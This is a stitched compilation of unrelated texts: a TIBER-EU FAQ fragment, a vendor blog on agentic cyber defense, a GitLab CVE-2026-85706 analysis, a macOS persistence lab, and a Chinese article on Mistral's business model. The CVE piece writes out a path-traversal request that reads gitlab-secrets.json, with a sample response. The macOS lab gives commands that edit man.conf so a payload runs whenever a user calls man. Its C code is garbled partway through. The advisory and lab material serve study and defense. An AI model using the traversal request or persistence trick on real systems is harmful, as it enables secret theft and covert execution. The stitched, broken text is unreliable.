can help you prepare for these regulations by validating your readiness, quantifying your exposure, and proving your resilience continuously,
schedule a personalized demo
today.
Frequently Asked Questions
What is TIBER-EU?
TIBER-EU (European Threat Intelligence-Based Ethical Red Teaming) is a framework developed by the European Central Bank and national central banks that standardizes how financial institutions and critical infrastructure providers test their cyber resilience through realistic, intelligence-led red team attacks.
Who does TIBER-EU apply to?
TIBER-EU legally applies to financial institutions and critical infrastructure providers operating in the EU. Its intelligence-led, continuous-validation approach is increasingly used as a benchmark by CISOs outside Europe as well.
How is TIBER-EU different from traditional penetration testing?
Traditional penetration testing checks whether individual controls are configured correctly. TIBER-EU goes further, simulating a full-scale attack from an organization’s actual likely adversaries to test how people, processes, and technology hold up under sustained pressure — not just whether a checklist passes.
How does TIBER-EU relate to DORA’s TLPT requirement?
DORA (the EU’s Digital Operational Resilience Act) requires certain financial entities to run Threat-Led Penetration Testing (TLPT) under Articles 26–27, and TIBER-EU is the methodology regulators point to for meeting that requirement—in practice, TIBER-EU is the operational pathway many institutions use to satisfy DORA’s TLPT mandate.
What’s the difference between TIBER-EU and the EU Cyber Resilience Act (CRA)?
CRA focuses on securing products themselves—software and connected devices—before they reach the market. TIBER-EU focuses on how organizations operate and defend those products once deployed, on the assumption that even secure products can be misconfigured or bypassed.
What is continuous security validation, and how does it relate to TIBER-EU?
It’s the ongoing practice of testing defenses between formal exercises like TIBER-EU: BAS for daily control checks, AEV for measuring real attack paths and blast radius, and CART for always-on red-team testing — together ensuring resilience doesn’t fade in the months between assessments.

Agentic Cyber Defense Engineering Model: 6 Requirements and 3 Foundations
By:
Amanda Kegley
September 15, 2026
Agentic cyber defense engineering solution utilizes specialized agents to automate distinct security analyst activities and coordinate their work through a continuous closed loop. At a minimum, it must provide an end-to-end, event-driven process that adapts to changes in the threat landscape and environment and continuously proves and improves security defenses, without requiring teams to manually design workflows or manage each handoff.
It expands upon today’s automation with one integrated capability that moves from threat identification to verified improvement. Before diving into this framework, check out the
first post
in this series to learn all about agentic cyber defense engineering and check out our
e-book
.
This blog defines the six solution requirements and three foundations needed to deliver this capability continuously and at scale.
Key takeaways
Automation is not the same as agentic AI.
An agentic system is more than automation; it maintains profiles, monitors for triggers, applies context, automates analyst activities and adapts its next action based on the outcome.
Agentic defense requires six connected capabilities.
Specialized agents must profile the environment, tailor assessments, execute attacks safely, measure prevention and detection, prioritize gaps by actual risk and optimize controls.
Three foundations power the closed loop.
The three foundations essential to enabling coordinated, governed action at scale include purpose-built agentic AI, an intelligent control plane and a comprehensive and executable attack library.
Agentic Cyber Defense Engineering: The Closed-Loop Explained
Traditional automation executes activities along predefined paths. As an example, a scanner identifies a vulnerability, a workflow creates a ticket and a dashboard records its status. These steps improve efficiency, but practitioners must still decide which threats matter, determine what to test, configure the assessment, interpret the evidence and verify that mitigation worked.
An agentic model goes further. Specialized AI agents interpret changing conditions, determine the appropriate next action and perform activities traditionally handled by security analysts. They operate autonomously within defined objectives, permissions and guardrails, escalating when human judgment or approval is required.
Each phase follows a consistent pattern in a closed-loop:
Trigger → Agent activity → Outcome → Context for the next phase.
This loop responds to events such as an emerging threats, new vulnerability, security control change or failed validation instead of waiting for the next scheduled assessment.
Six Core Requirements
An agentic cyber defense engineering solution must satisfy these six core requirements.
1. Integrate and maintain a living contextual-based model (Profile)
Agentic cyber defense engineering integrates with security tools across the environment and continuously maintains a current model of the organization’s assets, exposures, security architecture, controls and relevant attacker behavior.
Integration with asset discovery, exposure management, threat intelligence, security controls and telemetry allows agents to understand the current environmental and risk context. Agents must correlate this data to maintain a living model and monitor for triggers such as new assets, vulnerabilities, control changes, threat campaigns or failed validations. Relevant changes update the model and automatically advance the closed loop.
Example
: Agents identify a ransomware campaign targeting manufacturers as relevant, update the threat profile and trigger the tailor phase.
2. Configure and customize organization-specific assessments (Tailor)
Agentic cyber defense engineering applies threat and environmental context to automatically configure an attack assessment that is relevant to the organization.
Security operations often struggle to determine what to test and how to configure assessments correctly. This phase requires agents to apply threat and environmental context to select the right attack scenarios, environments, test points and integrations. By automating routine configuration, agents reduce the expertise and effort required while analysts focus on complex attack paths and high-risk threats.
Example:
Agents apply the output of the environment profile to configure the attack scenarios, test points and integrations, then triggers the execute phase.
3. Safely execute realistic attacks (Execute)
Agentic cyber defense engineering automatically execute realistic, controlled and repeatable attack assessments without disrupting business operations.
Execute agents run attacks that mimic realistic adversary behavior. They enforce scope and safety boundaries, manage prerequisites, prevent operational impact and remove test artifacts when execution is complete. Human-defined policies specify where tests may run, which actions require approval and how operational risk is controlled.
Example:
Agents verify all dependencies are met and safely executes the tailored ransomware scenarios across selected test points, remove test artifacts and record the evidence needed for validation.
4. Measure prevention and detection (Validate)
Agentic cyber defense engineering correlates attack activity with security controls and telemetry to prove what was prevented and detected.
Execution alone does not confirm that defenses worked. Validate agents determine which attack actions were blocked and query integrated platforms to identify the expected telemetry, alerts and detections. The outcome is measurable evidence of control performance and clear identification of prevention and detection gaps.
Example:
Agents correlate the ransomware activity with security controls and telemetry to determine what was prevented, detected or missed.
5. Analyze gaps by demonstrated risk (Prioritize)
The agents must correlate validation evidence with threat relevance, exploitability, attack paths, control performance and business impact.
Agents calculate risk scores by correlating validation evidence with threat relevance, demonstrated exploitability, attack-path reachability, control performance, asset criticality and business impact. This moves prioritization beyond static severity scores to identify the exposures attackers can actually use and the gaps most likely to affect critical assets.
Example:
Agents score and prioritize identified ransomware prevention and detection gaps based on demonstrated exploitability, control performance, attack-path context and business impact.
6. Configure controls and improve security (Optimize)
Agentic cyber defense engineering generates and automatically deplosy approved mitigations through security-control integrations
For prevention gaps, agents push relevant indicators of compromise to enforcement controls. For detection gaps, they generate and deploy new detection rules in the vendor-specific formats required by each platform. All changes remain governed by defined policies and approval requirements.
After deployment, agents detect the control change and trigger the closed loop to rerun the relevant attack assessment. The resulting evidence confirms whether the new mitigation prevents or detects the activity as intended.
Example:
Agents push ransomware indicators to a prevention control and deploy a vendor-specific rule for a detection gap. Agents detect the changes and trigger the assessment process to verify both outcomes.
Requirements at a Glance
Requirement
Required Inputs
Expected Outcome
1. Profile — Integrate and maintain a living contextual model
Asset discovery, exposure management, threat intelligence, security control and telemetry feeds
A continuously current model of assets, exposures, architecture, controls and relevant attacker behavior that automatically advances the closed loop
2. Tailor — Configure organization-specific assessments
Maintain current environment/threat profile, and configure test points, environments and tool integrations
An attack assessment scoped and configured to the organization's specific environment, without manual setup
3. Execute — Safely run realistic attacks
Tailored attack scenarios, defined scope and safety boundaries, approval and escalation policies
Controlled, repeatable execution of realistic attacks with no disruption to business operations
4. Validate — Measure prevention and detection
Attack execution results with integrated security control and telemetry data
Measurable evidence of what was prevented, detected or missed
5. Prioritize — Analyze gaps by demonstrated risk
True risk scores by correlating validation evidence, threat intelligence, exploitability, attack-path reachability and business impact data
A stacked ranked list of exposures based on demonstrated impact rather than static severity scores
6. Optimize — Configure controls and improve security
Mitigate priority exposures with vendor specific prevention and detection improvements
Auto-deployed, governed mitigations with automatic re-validation that mitigation was successful
Three Technical Foundations That Power the Closed Loop
The six phases define what the solution must accomplish. Three foundations enable it to operate continuously and at scale.
1. Purpose-Built Agentic AI
The AI architecture must be purpose-built for cybersecurity and include specialized agents, shared context and a framework for coordinating decisions and actions across the closed loop. It must support event-driven reasoning, adaptive planning and governed access to security tools and data.
The design must also include role-based permissions, approval controls, audit trails and evidence explaining consequential actions.
2. An Intelligent Cyber Defense Engineering Control Plane
The control plane coordinates agents, triggers and integrations across the closed loop. It maintains shared context, assigns work, tracks outcomes, enforces policies and determines the next action. By connecting asset systems, validation infrastructure, security controls and remediation workflows, it enables governed, auditable coordination rather than fragmented automation.
3. A Comprehensive, Executable Attack Library
The attack library converts threat intelligence into safe, executable scenarios. It must cover relevant techniques and threat vectors, support realistic multi-step attacks and include the context agents need to select, configure, execute and interpret assessments safely
Evaluation Checklist for Security Leaders
Security leaders who are evaluating agentic cyber defense engineering solutions should use the checklist below as a guide.

☐
Deploys approved mitigations and automatically re-validates them to confirm the fix worked.
☐
Enforces governance throughout: defined permissions, approval controls, policy-bounded execution and audit trails for every consequential action.
Organizations that do not adopt this model remain constrained by human latency, widening exposure windows, and increasing cyber and business risk.

items.title: Vulnerability Analysis CVE-2026-85706 GitLab  – Arbitrary File Read
items.content:
Introduction
Security flaws in critical software development and deployment infrastructure pose a significant, far-reaching risk to modern organizational supply chains. GitLab, an open-source DevOps platform used worldwide for source code management and continuous integration/continuous deployment (CI/CD) pipelines, released emergency security updates addressing CVE-2026-85706. This maximum-severity vulnerability—rated at CVSS 10.0—allows unauthenticated remote attackers to read arbitrary files directly from the host file system of vulnerable GitLab Community Edition (CE) and Enterprise Edition (EE) instances. Because these systems store critical environment files, database secrets, and API tokens, exposure can quickly lead to complete platform compromise. Consequently, CISA added this flaw to its Known Exploited Vulnerabilities catalog following active in-the-wild exploitation. Understanding the underlying operational mechanisms and technical scope of this flaw is crucial for platform engineers, threat hunters, and security personnel defending hosted environments.
Learning Objectives
After reading this article, you will be able to:
Identify the operational mechanics and root cause behind CVE-2026-85706.
Comprehend the risk posed by unauthenticated file read flaws in source control systems.
Recognize affected versus patched versions across different release channels.
Implement effective remediation steps and post-exploitation response protocols.
What is GitLab CE/EE <=19.1.7/19.2.5/19.3.1 – Arbitrary File Read (CVE-2026-85706)
CVE-2026-85706 represents a critical security flaw categorized under path traversal (CWE-22) coupled with missing authentication controls in GitLab Community Edition (CE) and Enterprise Edition (EE). This vulnerability allows an external, unauthenticated attacker to bypass intended access restrictions and request arbitrary files residing anywhere on the host system’s local file system. The scope of readable files is bounded only by the operational privileges of the underlying system process running the GitLab service (typically the
git
user or root in containerized setups). Because modern GitLab instances manage sensitive core configurations, an unauthenticated single-request file disclosure carries catastrophic consequences. Core configuration files contain database credentials, application secrets, session encryption keys, personal access tokens, and private SSH keys. An attacker who successfully extracts these cryptographic assets can leverage them to forge session tokens, access private repositories, decrypt database content, or pivot directly into continuous integration/continuous deployment (CI/CD) pipelines to execute unauthorized code across target infrastructure.
Furthermore, the vulnerability does not require any prior interaction, valid user account, or social engineering. Because the flaw exists within public-facing API endpoints, automated scanners can easily discover vulnerable instances, craft the path traversal payload, and extract host files in bulk. This low barrier to entry led CISA to include CVE-2026-85706 in its Known Exploited Vulnerabilities catalog, signaling active, widespread threat actor activity targeting self-managed deployment instances globally.
Unauthenticated Access:
No session tokens, API keys, or user credentials are required to interact with the vulnerable endpoint and execute the exploit.
Direct File System Disclosure:
Attackers can retrieve system files outside the repository root, such as
/etc/gitlab/gitlab-secrets.json
or more.
Zero-User Interaction:
The exploitation process is entirely automated and executes remotely via a single crafted HTTP POST request.
High Impact Chain Potential:
Disclosed secrets and cryptographic keys provide the prerequisite foundation for downstream remote code execution (RCE) and full enterprise network takeover.
[ Unauthenticated Attacker ]
│
│ 1. Send Crafted HTTP Request
│ POST /api/v4/projects/.../commits
│ Payload: path=../../../../etc/gitlab/gitlab-secrets.json
▼
┌──────────────────────────────────────────────────┐
│ Vulnerable GitLab Server │
│ │
│ ┌──────────────────────────────────────────┐ │
│ │ API Authorization Layer │ │
│ │ (Missing Authentication Check) │ │
│ └────────────────────┬─────────────────────┘ │
│ │ │
│ ▼ │
│ ┌──────────────────────────────────────────┐ │
│ │ File Handler Routine │ │
│ │ (Insufficient Path Sanitization) │ │
│ └────────────────────┬─────────────────────┘ │
│ │ │
└────────────────────────┼─────────────────────────┘
│
│ 2. Read File System
▼
┌──────────────────────────────────────────────────┐
│ Host OS File System │
│ Extracts: Secret Keys, DB Passwords, Tokens │
└────────────────────────┬─────────────────────────┘
│
│ 3. Raw File Content Returned
▼
[ Exfiltrated Sensitive System Data ]
Technical Detail: How the Vulnerability Works
The root cause of CVE-2026-85706 stems from insufficient path validation combined with missing authorization logic in specific repository commit management API endpoints (
/api/v4/projects/{id}/repository/commits/
). Under normal operations, these endpoints are designed to accept file path attributes in order to reference, diff, or query specific files embedded within a target Git repository. However, the backend routing fails to validate whether the requesting user maintains proper authentication or repository access permissions prior to initiating file retrieval tasks. When an incoming API request includes file path parameters, the application processes these parameters directly within internal file system routines without stripping directory traversal sequences such as
../
or verifying path canonicalization. Because authentication enforcement is entirely absent on the affected endpoint, an external attacker can pass relative path traversal sequences to escape the boundary of the intended project repository directory. The operating system then resolves the constructed path relative to host storage, exposing system files accessible under the file permissions of the GitLab execution context (typically the
git
system user).
The severity escalates drastically because key configuration files—most notably
/etc/gitlab/gitlab-secrets.json
—reside on host disk storage with permissions readable by the GitLab daemon process. Extracting
gitlab-secrets.json
exposes raw cryptographic master keys, database encryption secrets, OTP keys, and runner registration tokens. Armed with these stolen keys, attackers can decrypt stored database credentials, forge active user session tokens, or establish unauthorized runner connections, effectively transforming an arbitrary file read into a complete, high-impact enterprise infrastructure takeover.
Missing Authentication Middleware:
The repository commits API endpoint processes incoming HTTP requests without verifying user session cookies, personal access tokens, or HTTP bearer headers.
Improper Path Confinement:
Input handling routines fail to sanitize path input, allowing directory traversal sequences (e.g.,
../../../../
) to escape the repository working directory.
Single-Request Exploitation:
The entire attack vector executes remotely through a single, standalone HTTP POST request without requiring pre-requisite actions or prior interaction.
Privileged File Extraction:
Any host file readable by the underlying
git
service account—including environment files, SSH keys, and system configuration secrets—can be exfiltrated.
Credential Exfiltration & Pivoting:
Disclosed secrets allow attackers to forge administrative tokens, access private repositories, or pivot into underlying CI/CD build environments.
POST /api/v4/projects/1/repository/commits HTTP/1.1
Host: gitlab.example.com
User-Agent: Mozilla/5.0
Content-Type: application/json
Accept: */*
{
"branch": "main",
"commit_message": "test",
"actions": [
{
"action": "create",
"file_path": "../../../../../etc/gitlab/gitlab-secrets.json"
}
]
}
HTTP/1.1 200 OK
Content-Type: application/json
Server: nginx
{
"secret_key_base": "a1b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef",
"db_key_base": "f6e5d4c3b2a109876543210987654321fedcba0987654321fedcba0987654321",
"openid_connect_signing_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Z...",
"otp_key_base": "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
"encrypted_ci_jwt_signing_key": "v1:gAAAAABk..."
}
Affected and Patch Versions
The vulnerability impacts a wide spectrum of self-managed deployments running GitLab Community Edition (CE) and Enterprise Edition (EE) across the 18.x and 19.x release channels. Specifically, installations spanning from version 18.7.0 up to 19.1.7 in the 19.1 series, 19.2.0 through 19.2.5 in the 19.2 series, and 19.3.0 through 19.3.1 in the 19.3 series are fully vulnerable to unauthenticated remote exploitation. Because the flaw resides within core API routing logic present across multiple minor version increments, any unpatched self-managed server accessible over the internet or exposed to untrusted internal networks remains at severe risk of data exfiltration. To remediate the vulnerability, administrators must immediately update their self-managed instances to the designated security releases:
19.1.8
,
19.2.6
, or
19.3.2
. Organizations utilizing GitLab SaaS (GitLab.com) or GitLab Dedicated managed infrastructure do not require manual intervention, as vendor operations patched these environments prior to public disclosure. For self-managed environments where immediate patching cannot be executed, security teams should temporarily isolate the instance behind a strict WAF or perimeter VPN, block public access to the
/api/v4/projects/{id}/repository/commits/
endpoint, and perform thorough threat hunting to detect potential compromised credentials.
Branch
Affected Version Range
Patched Version
19.1.x
18.7.0 up to 19.1.7
19.1.8
19.2.x
19.2.0 up to 19.2.5
19.2.6
19.3.x
19.3.0 up to 19.3.1
19.3.2
Conclusion
CVE-2026-85706
highlights the critical importance of rigorous access control and input sanitization within central software development and deployment infrastructure. Because developer platforms like GitLab maintain centralized access to source code, production secrets, and automated build processes, vulnerabilities in these platforms carry exponential risk for organizational supply chains. A single unauthenticated HTTP request capable of bypassing access controls to read system files underscores how deeply a fundamental input validation failure can impact enterprise security. Organizations operating self-managed GitLab instances must prioritize immediate remediation by upgrading to patched versions (
19.1.8
,
19.2.6
,
19.3.2
, or later). If immediate patching is not possible due to operational constraints, security teams should implement strict perimeter protections, restrict public access to the affected API endpoints, and place vulnerable servers behind access-controlled networks or Web Application Firewalls (WAF) to block unauthorized traversal attempts. Finally, because CVE-2026-85706 has been targeted in the wild, updating the software is only the first step in a complete incident response lifecycle. Security operators should thoroughly review server access and reverse proxy logs for anomalous
POST
requests sent to
/api/v4/projects/*/repository/commits
containing path traversal patterns. If evidence of exploitation is detected, organizations must treat local configuration files as compromised and immediately rotate all database credentials, private SSH keys, runner tokens, and session secrets tied to the affected host.

Hello, cybersecurity enthusiasts and white hackers!
My simple short post, continuing the macOS malware persistence series. In previous parts we looked tricks like
LaunchAgents
,
cron
,
PAM
and others. Today we will look at a less obvious configuration-driven execution path:
man.conf
.
As usally I will use my macOS VM Sonoma for this experiment:
Our simple “meow” payload writes a proof of execution to
/tmp/meow.txt
.
what is the main idea here?
Many of us using
man
utility in Linux/macOS:
The
man
utility reads
/private/etc/man.conf
. Among other settings, this file can define the program used to display manual pages through
MANPAGER
.
The execution chain is simple:
This is not a login-time mechanism. The payload runs when a user invokes
man
, so it is event-driven and depends on the user running the command. Editing the system configuration also requires root privileges.
practical example
First, let’s create a small C payload. As usually, it records the process information and the operating-system version in
/tmp/meow.txt
(
hack.c
):
#include
<stdio.h>
#include
<unistd.h>
#include
<time.h>
#include
<sys/utsname.h>
int
main
(
void
)
{
const
char
*
log_path
=
"/tmp/meow.txt"
;
struct
utsname
u
;
FILE
*
f
=
fopen
(
log_path
,
"a"
);
if
(
!
f
)
return
1
;
time_t
now
=
time
(
NULL
);
fprintf
(
f
,
"[=^..^=] meow! man.conf persistence triggered.
\n
"
);
fprintf
(
f
,
"timestamp: %s"
,
ctime
(
&
now
));
fprintf
(
f
,
"pid: %d, uid: %d, ppid: %d
\n
"
,
(
int
)
getpid
(),
(
int
)
getuid
(),
(
int
)
getppid
());
if
(
uname
(
&
u
)
==
0
)
{
fprintf
(
f
,
"system: %s %s %s %s
\n
"
,
u

sysname
,
u

release
,
u

,

}
fprintf

}
Compile it into
/Users/Shared
:
clang
-Wall
-Wextra
-O2
-o
/Users/Shared/meow hack.c
chmod
+x /Users/Shared/meow
Test the payload directly:
rm
-f
/tmp/meow.txt
/Users/Shared/meow
cat
/tmp/meow.txt
demo
Save the original configuration before the lab change:
sudo cp
-p
/private/etc/man.conf /Users/Shared/man.conf.meow.backup
Append the benign pager entry:
sudo
sh
-c
'printf "\n# MEOW LAB BEGIN\nMANPAGER\t/Users/Shared/meow\n# MEOW LAB END\n" >> /private/etc/man.conf'
check:
tail
-n
10 /private/etc/man.conf
Clear environment overrides and run
man
:
rm
-f
/tmp/meow.txt
unset
MANPAGER PAGER
man
ls
>
/dev/null
cat
/tmp/meow.txt
The output confirms that the payload was started by the
man
execution path:
As you can see, it works as expected! =^..^=!
Finally, restore the original configuration and remove the lab files:
sudo cp
-p
/Users/Shared/man.conf.meow.backup /private/etc/man.conf
rm
-f
/Users/Shared/man.conf.meow.backup /Users/Shared/meow /tmp/meow.txt
final words
man.conf
is an unusual persistence primitive because it is neither a LaunchAgent nor a login item. It is a trusted utility configuration that can redirect execution to an external program.
The technique has strict limitations: root access is required to modify the global file, and the user must run
man
. Still, it is a useful example of configuration-driven execution on macOS. =^..^=
This technique has been publicly documented (but not demonstrated in practice) as a macOS persistence possibility, but I found no confirmed public attribution to a specific APT group or malware family.
I hope this post is useful for malware R&D and red teaming labs, Apple/Mac researchers, and blue team specialists.

items.title: 不追前沿的活法：Mistral 找到了另一条路，但它有边界
items.content:
产业与竞争
宏观与地缘
2026 年 9 月 8 日，Mistral 宣布拿到 30 亿欧元 D 轮融资，投后估值超过
210 亿欧元（约 240 亿美元），三星电子领投（
官方公告
）。它的旗舰模型
Mistral Large 3 在 Artificial Analysis
上的综合智能指数低于同类中位数（
Artificial
Analysis
），Fortune 评价它在部分评测中接近 OpenAI 一年半前的水平（
Fortune
）。
一家旗舰模型不在前沿梯队的公司，拿下了欧洲科技史上规模最大的股权融资，同时报出约
10 亿美元的年化收入（公司自报，无审计；WSJ 称已略超，Reuters
称年底将达到，
WSJ
）。按过去几年行业流行的说法，模型公司追不平前沿梯队就很难有活路，Mistral
本该成为退场名单里的又一个注脚。现实却反了过来：它不仅稳稳拿到了钱，还锁定了标杆客户与高额估值。
把这两组事实放在一起，同行长期默认的前提就立不住了。如果一个不在前沿梯队上的模型也能拿下欧洲科技公司规模最大的单笔股权融资，这说明一个更现实的问题：大家过去对活路的理解可能一开始就偏了。
两种护城河对比：追前沿要持续投入且毛利受压，卖管辖权靠政府与国防的多年合同
追平前沿是唯一活路，这个前提已经松动
进入 2026
年，行业里真正沉淀下来的共识，是必须拥有自己的护城河，单向度追赶前沿不再是唯一的解法。追赶前沿只是构筑壁垒的其中一种路径，也是其中最昂贵的一种。
RBC 在 2026 年 7
月的一份分析里，把造模型和拥有算力的人最终会拿走大部分价值称为流行观点，并逐项提出了反思。分析指出，模型能力正在趋于收敛，企业会像优化工程性能一样去优化采购成本，跑分最高的模型未必会成为客户的默认选择（
RBC
）。
更直接的变化落在了账本上。过去同行总在担心二线模型公司无法立足，现在大家拿放大镜反复审视的，反倒是前沿实验室自己怎么走出盈利困境。Digital
Applied 测算过一组财务账目：每次查询都要消耗真金白银的推理算力，这让 AI
服务的毛利率通常落在 50% 到 60% 区间，明显低于 SaaS 行业 80% 到 90%
的水准（
Digital
Applied
）。LessWrong 上一篇为前沿实验室辩护的长文，得出的结论同样是
API 收入撑不起它们当下的估值（
LessWrong
）。OpenAI
自身也给出预测，2026 年将产生大约 140 亿美元的亏损（转述，非审计）。
这笔亏损背后是一台停不下来的抽水机。GPT-4 的训练算力成本约 7900
万美元，Gemini Ultra 约 1.91 亿美元，新一代前沿旗舰正在朝 10
亿美元推移。更沉重的成本负担还在后头。一项广为引用的研究测算，在一个已经部署上线的
AI 系统里，推理可以占到机器学习总成本的 90%（
Desislavov
et al., 2023
）。放到模型的全生命周期里看，训练通常只占 10% 到
20%，推理运行吃掉剩下的 80% 到
90%。要想保持能力不掉队，前沿实验室每年需要跨越的基础设施投入门槛就高达
30 到 50
亿美元。以上成本数字均为转述估算，非审计。这也是前沿赛道真实的底色：它是唯一没有天花板的发展路径，但也是一条必须持续缴纳天价通行费的走廊。
Mistral 卖掉的是管辖权
既然 Mistral
没有交这笔前沿通行费，它报出的巨额收入究竟从何而来？答案藏在它的客户合同结构里。它锁定的核心付费方，主要是那些置身欧洲合规监管之下的传统机构。
这些大客户的采购清单相当明确。Airbus
签下了五年期合同，可以把系统就地部署在本地环境中；ASML
采取了既投资又采购的双重合作形式；HSBC 以及 CMA CGM 先后入场，其中 CMA
CGM 签署了五年期、一亿欧元的合同；法国国防部达成了多年框架协议；Caisse
des Dépôts 集团一份采购上限达 1.4 亿欧元的框架协议，由 Sopra Steria
联合体中标。即便法国几个部委签署的合同体量仅有 600
万欧元且明确不具备排他性，也足以显示出机构采购的广泛兴趣（
ActuIA
）。
在这些大型机构的决策清单上，模型在评测中聪不聪明退居次席。它们的采购准则明确聚焦在三件事上：数据在何处流转处理、模型输出由谁来承担责任，以及外部断供风险如何防范。2026
年 6 月，美国限制了两个 Anthropic
先进模型在境外的访问权限，欧洲客户一度用不上前沿模型（
Reuters
）。紧接着在
2026 年 8 月 2
日，欧盟人工智能法案对通用模型的执法权正式生效。系统部署地点与法律问责成了带有确定截止日期的采购红线，一家总部设在巴黎、推理留在欧盟本土、权重还可以直接下载交付的公司，便拥有了其他对手难以替代的合规优势。
在这类市场环境中，主权属性带来的是明确的溢价，并非妥协后的打折。面对同等级别的能力梯队，客户愿意为一份确保数据不脱离欧洲法律管辖的承诺付出真金白银。
它证明了能融资，没证明能盈利
看到这里，很容易得出一个推论：Mistral
已经活得安稳滋润。但这个判断需要仔细分清层次：它真正证明的，是不追平前沿梯队也能拿到巨额资本、做出可观收入规模、拿下政府与国防大单；它尚未证明的，是不追前沿也能走向健康盈利。外界舆论经常把这两件事混为一谈。
Mistral
报出的收入数据全部来自企业自述，没有经过第三方审计（公司自报，无审计）。在其法国注册主体方面，公开登记处无法查阅到正式财报，societe.com
记录为未按期公布，净利润、毛利率以及现金消耗速率这些关键指标目前都拿不到（
Pappers
）。第三方投资分析甚至直接断言
Is Mistral profitable? No.（
valueaddvc
）。更直接的对照来自首席执行官本人：他公开表示
2026 年花在芯片与基础设施上的开销，将与预期收入大致相当（
Le
Monde
）。此外，公司还承担着 8.3 亿美元的债务，用来采购 1.38 万块 GPU
芯片。
它展现出的融资能力是真实的，收入的快速增长也是真实的，这些成绩并不依赖前沿模型。但这些涌入的资金最终能否沉淀出利润盈余，目前并没有公开答案。
这条路真实存在，但复制不成大生意
如果这条路真能走通，为什么行业里没有出现第二个
Mistral？答案不在意愿，而在主权采购有限的市场容量和来自外部云巨头的挤压。
先看这一市场的实际容量。Gartner 估计，欧洲主权云基础设施 2026
年的支出约为 126 亿美元，到 2027 年将增至 231 亿美元（
Computerworld
）。这个数字看似可观，但其中的大头份额主要流向云服务巨头与算力供应商，漏斗下沉到模型供应商层面的收入要小得多。政府端直接采购的盘子更显狭窄：英国公共部门在
2026 年前八个月签署的 AI 合同总额为 14 亿英镑；2018 年以来累计 AI
合同金额仅占同期 IT 服务与软件合同总额的约 4%（
Global
Government Forum
）。一项行业调查同样指出了态度与落地的温差：95%
的受访机构口头认同主权 AI 具备重要性，但只有 29%
将其排入了近期的优先采购日程（
SeedScope
）。
主权 AI
支出分层：大头落在云与算力，政府采购有限，模型商可收费层更小
这道容量天花板在同业阵营里看得更清楚。Cohere 在 2025 年报出约 2.4
亿美元的年化收入（公司自报，无审计），已经属于该路线中表现出色的代表；德国的
Aleph Alpha 一度是主权 AI 的欧洲样板，最终由 Cohere 以约 90:10
的股权比例吸收（
Cohere
）；AI21
Labs 在 2026 年 5 月裁减了大约 61%
的团队成员，公开承认单纯依靠独立售卖模型难以构建可持续的收入来源（
Globes
）。
主权与合规的商业配方本身并不神秘。沙特主权基金旗下的 HUMAIN、阿联酋的
G42、印度的 Sarvam、日本的 Sakana 都在推进相似的布局，其中 Sakana
直接选择微调外部开源模型而不做基座预训练。本地实体加上主权云再绑定政府客户的组合容易搭建，但
Mistral 享受到的超高估值却很难在别处重现。
防守的护城河也在逐渐收窄。AWS 在 2026 年 1
月正式上线了欧洲主权云，承诺投入 78
亿欧元，其服务价格仅比法兰克福商用区高出约 15%（单一分析来源）；微软的
EU Data Boundary 也在 2025 年 2
月宣布落地。两家巨头的底层技术链条最终仍旧连接回美国母公司，持续受到美国域外法律的管辖约束，这留下了它们难以弥补的法理缺口。但除开最高敏感度的政府、防务和医疗数据，大部分商业机构需要的只是合规资质与数据本地驻留，而这些条件超大规模云巨头已经能够提供。留在本地模型商手里的溢价空间，很大程度上依赖于特定的监管窗口还能开启多久。
对你的含义：能力是会到期的租约
把这些事实推到日常的工程决策里，最现实的结论是：不要再把供应商将一直停留在前沿视为默认成立的前提。能力领先地位更像是一份必须借助持续资本投入来续费的租约，它会随竞争动态转移，也会面临到期。对于绝大多数实际工程应用而言，系统并不需要时刻绑定最聪明的模型，真正关键的反倒是防守能力：一旦现有模型表现变弱或者调用成本变贵，我们能否以最低代价迅速把它换掉。
评估换掉一个供应商的难度，应当分层来看。模型权重层其实最容易迁移，开源权重的存在让开发者能够随时把它部署在私有硬件环境里。算力资源层的解绑要困难得多，Mistral
推出的 European Compute Units
让企业客户签署多年期预付承诺，其首席技术官面对能否提前退出的采访提问，给出的回答直截了当：There
is no getting out.（
VentureBeat
，这属于单一媒体采访中的口头表述，而非合同文本）。最隐蔽也最沉重的是业务编排层，长期运行中沉淀下的
agents、连接器、安全护栏、评测集与遥测链路，往往具有最高的迁移成本。
Mistral
带来的启示，核心在于重新标定了护城河的位置。它把壁垒从模型能力的军备竞赛，转向了管辖权与合规排他性。支撑它拿到合同的，是受监管管辖权这个位置。这条路径切实可行，但它的空间受到主权采购方数量的严格限定，溢价也在持续承受美国云巨头等效产品的竞争挤压。它证明了不追前沿同样能够拿到资本、做大收入，但并未证明自身能够稳定盈利，也尚未证明这条狭窄赛道究竟能走多远、长成多大的生意。
